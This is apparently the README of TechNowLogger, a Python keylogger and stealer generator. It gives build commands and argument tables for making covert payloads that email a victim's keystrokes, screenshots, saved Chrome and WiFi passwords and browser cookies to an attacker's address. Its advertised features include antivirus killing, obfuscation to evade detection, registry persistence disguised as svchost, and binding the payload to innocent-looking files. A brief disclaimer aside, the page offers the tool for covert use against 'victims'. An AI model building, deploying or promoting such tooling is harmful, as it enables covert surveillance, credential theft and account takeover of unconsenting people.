<p align="center">
  <img src="https://github.com/PushpenderIndia/technowlogger/blob/master/img/technowlogger-logo.png" alt="TechNowLogger Logo" width=200 height=200/>
</p>

<h1 align="center">TechNowLogger</h1>
<p align="center">
    <a href="https://python.org">
    <img src="https://img.shields.io/badge/Python-3.7-green.svg">
  </a>
  <a href="https://github.com/PushpenderIndia/technowhorse/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-BSD%203-lightgrey.svg">
  </a>
  <a href="https://github.com/PushpenderIndia/technowhorse/releases">
    <img src="https://img.shields.io/badge/Release-1.9-blue.svg">
  </a>
    <a href="https://github.com/PushpenderIndia/technowhorse">
    <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-brightgreen.svg">
  </a>
</p>

<p align="center">
  <img src="https://github.com/PushpenderIndia/technowlogger/blob/master/img/hacker-gif.gif" alt="Hacker GIF" width=200 height=200/>
</p>
             
                        This small python script can do really awesome work.

TechNowLogger is Keylogger Generator for Windows/Linux, which sends key-logs & screenshot via email with other juicy target info written in Python 3.

## Disclaimer
<p align="center">
  :computer: This project was created only for good purposes and personal use.
</p>

THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.

## Features
- [x] Works on Windows/Linux
- [x] Notify New Victim Via Email
- [x] Undetectable
- [x] Persistence
- [x] Sends Screenshot of Victim PC's Screen via email
- [x] Creates Executable Binary With Zero Dependencies
- [x] Create less size ~ 5mb payload with advance functionality
- [x] Obfusticate the Payload before Generating it, hence Bypassing few more antivirus
- [x] Generated Payload is Encoded with base64, hence makes extremely difficult to reverse engineer the payload
- [x] Function to Kill Antivirus on Victim PC and tries to disable the security
- [x] Awesome Colourful Interface to generate payload
- [x] On Attacker Side: While Creating Payload, Script Automatically Detects Missing Dependencies & Installs Them
- [x] Distinguish Log Data on the Basics of Active Window Name  **(Check Image for Better Understanding)**
- [x] Able to add custom Icon to evil file
- [x] **Built-in Binder** which can bind Keylogger to **Any File** [.pdf, .txt, .exe etc], Running legitimate file on front end & evil codes in back-end as a service.
- [x] Checks for **Already Running Instance** on System, If running instance found, then only legitimate file is executed [**Multiple Instance Prohibiter** to avoid Receiving Duplicate Email Logs].
- [x] Attacker can Create/Compile for Both **Windows/Linux OS** Using Linux System, But Can only Create/Compile **Windows** Executable using Windows Machine
- [x] Retrieves Saved Passwords from victim System and sends it to Attacker.

| Built-in Stealer Can Steal These Things : |
| ----------------------------------------------------------- |
| Chrome Browser (Saved Password) |
| WiFi (Saved Password) |
| Chrome Cookies (Login Data, Cookies, History) |
| Firefox Cookies (cookies.sqlite) |
#### Note: Custom Stealer is Coded, does not relies on LaZagne

- [x] Grabs & Send Useful Information of Victim's Device

| These Things are Grabbed & Sended: |
| -----------------------------------|
| Operating System |
| Computer Name    |
| User Name |
| Public IPv4 |

- [x] If your payload is unable to execute, then specify --debug to run exe on foreground with CMD

## Important
On **30 May 2022**, Google has **removed less secure apps feature**, so instead of Gmail Password:
- Enable 2FA on your attacker gmail
- Create App Specific Password
- Use that `app specific password`, while creating payload. 
- How to Create App Specific Password: [Click Here](https://support.google.com/mail/answer/185833?hl=en) 


## Tested On
[![Kali)](https://www.google.com/s2/favicons?domain=https://www.kali.org/)](https://www.kali.org) **Kali Linux - ROLLING EDITION**

[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 10**

[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 8.1 - Pro**

[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 7 - Ultimate**

## Prerequisite
- [x] Python 3.X
- [x] Few External Modules

## How To Use in Linux
```bash
# Navigate to the /opt directory (optional)
$ cd /opt/

# Clone this repository
$ git clone https://github.com/PushpenderIndia/technowlogger.git

# Navigate to technowlogger folder
$ cd technowlogger

# Installing dependencies
$ bash installer_linux.sh

*** Note When The Python Installer DialogBox Appear while executing installer_linux.sh ***
    * Click on custom install 
    * Select Path to : C:/Python37-32
    ### So that the python is installed in this path (Inside Wine) : ~/.wine/drive_c/Python37-32

# If you are getting any errors while executing installer_linux.sh, try to install using installer_linux.py
$ python3 installer_linux.py

$ chmod +x technowgen.py
$ python3 technowgen.py --help

# Making Payload/RAT
$ python3 technowgen.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path

Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
```

## How To Use in Windows
```bash
# Install dependencies 
$ Install latest python 3.x

# Clone this repository
$ git clone https://github.com/PushpenderIndia/technowlogger.git

# Go into the repository
$ cd technowlogger

# Installing dependencies
$ python -m pip install -r requirements.txt

# Open technowgen.py in Text editor and Configure Line 16 WINDOWS_PYTHON_PYINSTALLER_PATH = "C:/Python37-32/Scripts/pyinstaller.exe" 

# Getting Help Menu
$ python technowgen.py --help

# Making Payload/RAT
$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -w -o output_file_name --icon icon_path

Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
```

## How to Update

* Run updater.py to Update Autmatically or Download the latest Zip from this GitHub repo
* Note: Git Must be Installed in order to use updater.py

## Note:- Evil File will be saved inside dist/ folder, inside technowlogger/ folder

## Available Arguments 
* Optional Arguments

| Short Hand  | Full Hand | Description |
| ----------  | --------- | ----------- |
| -h          | --help    | show this help message and exit |
| -i INTERVAL | --interval INTERVAL | Time between reports in seconds. default=120|
| -t TIME_PERSISTENT | --persistence TIME_PERSISTENT | Becoming Persistence After __ seconds. default=10 |
|  -w | --windows | Generate a Windows executable. |
|  -l | --linux   | Generate a Linux executable. |
|  -s | --steal-password | Steal Saved Password from Victim Machine [**Supported OS : Windows**] |
| -b file.txt | --bind LEGITIMATE_FILE_PATH.pdf | AutoBinder : Specify Path of Legitimate file. [**Supported OS : Windows**] |
| -d | --debug | Payload Will Run In Foreground with CMD Window, To get Appropriate Execution Error |
#### Note : Either **-w/--windows** or  **-l/--linux** must be specified 

* Required Arguments

| Short Hand  | Full Hand | Description |
| ----------  | --------- | ----------- |
|             | --icon ICON   | Specify Icon Path, Icon of Evil File [**Note : Must Be .ico**] |
| -e EMAIL    | --email EMAIL | Email address to send reports to. |
| -p PASSWORD | --password PASSWORD | Password for the email address given in the -e argument. |
| -o OUT      | --out OUT    | Output file name.|

## New Screenshots:


#### Getting Help
![](/img/1.version_1.3.PNG)

#### Generating payload
![](/img/2.version_1.3.PNG)

#### Getting report
![](/img/3.version_1.2.PNG)

#### Log Data is Distinguished on The Basics of Active Window Name ~ Feature Added to v1.3 & Onward
![](/img/10.distinguish_log_data_v1.3.PNG)

#### Retrives & Sends Saved Chrome Browser's Password 
* Note: In order to use this feature, specify **-s or --steal-password** while creating keylogger
![](/img/saved_chrome_browser_password.PNG)

#### Retrives & Sends Saved WIFI Password 
* Note: In order to use this feature, specify **-s or --steal-password** while creating keylogger
![](/img/saved_wifi_password.PNG)
 	
### Also Refer These Old Images

## ~Old Screenshots:

#### Getting Help
![](/img/1.help.png)

#### Running technowgen.py Script
![](/img/2.running_script.png)

#### Building Finished
![](/img/3.building_finished.png)

#### When Keylogger runs, it adds Registry to become persistence
![](/img/4.keylogger_added_registry_for_persistence.png)

#### Makes copy of itself and saved it inside Roaming
![](/img/5.keylogger_saved_roaming.png)

#### Typing Random text to test Keylogger
![](/img/6.randomText-to-test-keylogger.png)

#### Report 1 sended by TechNowLogger
![](/img/7.result.png)

#### Login facebook ~ Victim
![](/img/8.testing-keylogger.png)

#### Report 2 - Keylogs of facebook Credentials
![](/img/9.report-1.png)

#### Report 3 - With Screenshots
![](/img/10.report-2.png)

## Debug Issues

Try to Run **Offline Keylogger** in order to test Offline Key logs capturing & Debug keylogger issues by running these commands:

Run **test_key.py** In both the modes [**Compiled & Raw**] and figure out whats the error

Run it like this : `python test_key.py`

Also Compile it like this:
`pyinstaller --onefile test_key.py --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard`

After running it, Start typing something,
Result will be displayed on the Command prompt after every 10 seconds

**Offline keylogger's files are present in TestKeylogger Folder**

* If payload is unable to execute on victim's system
```
1. Create a new payload with --debug flag
2. Run payload exe throught cmd [Don't Execute Payload By Double Clicking It]
3. It will now give more appropriate error in CMD, just put that issue in Issue Section
```

## Removing TechNowLogger in Windows:

#### Method 1:

   * Go to start, type regedit and run the first program, this will open the registry editor.
   * Navigate to the following path Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run There should be an entry called svchost, right click this entry and select Delete.
   * Go to your user path > AppData > Roaming, you’ll see a file named “svchost.exe”, this is the RAT, right click > Delete.
   * Restart the System.

#### Method 2:
   * Run "RemoveTechnowLogger.bat" in Infected System and then restart the PC to stop the current Running Evil File.



## Removing TechNowLogger in Linux:

   * Open Autostart file with any text editor,
     ****Autostart File Path: ~/.config/autostart/xinput.desktop****
   * Remove these 5 lines:
   
            [Desktop Entry]
            Type=Application
            X-GNOME-Autostart-enabled=true
            Name=Xinput
            Exec="destination_file_name"
        
   * Note: **destination_file_name** is that name of evil_file which you gave 
      to your Keylogger using -o parameter
   * Reboot your system and then delete the evil file stored this this below path
   * Destination Path, where Keylogger is stored : **~/.config/xnput**

## Contribute

* All Contributors are welcome, this repo needs contributors who will improve this tool to make it best.

## TODO

- [ ] Add New features
- [ ] Contribute GUI Version

## More Features Coming Soon...
